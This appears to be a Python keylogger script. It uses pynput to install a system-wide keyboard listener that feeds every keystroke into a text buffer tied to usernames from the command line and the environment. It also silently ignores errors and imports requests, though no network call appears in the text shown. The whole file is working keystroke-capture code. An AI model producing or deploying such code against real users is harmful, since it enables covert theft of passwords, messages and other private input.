import os
import sys
import requests
from utils import TextBuffer, get_bool, decode_win, decode_none
from pynput import keyboard
from pynput.keyboard import Key, KeyCode
from dotenv import load_dotenv

load_dotenv()

DEBUG = get_bool(os.environ.get('DEBUG'))

usernames = sys.argv[1:]

usernames.append(os.environ.get("USERNAME"))

usernames.append("undefined")

text_buffer = TextBuffer(usernames)

if sys.platform == "win32":
    decode = decode_win
else:
    decode = decode_none


def on_press(key: KeyCode) -> None or bool:
    try:
        decoded_keycode = decode(key)
        text_buffer.handle_char(decoded_keycode)

    except AttributeError:
        if key == Key.backspace:
            text_buffer.handle_backspace()
        if key == Key.enter:
            text_buffer.handle_enter()
        if key == Key.space:
            text_buffer.handle_space()
        if DEBUG:
            if key == Key.esc:
                return text_buffer.handle_esc()
    except Exception:
        pass


with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
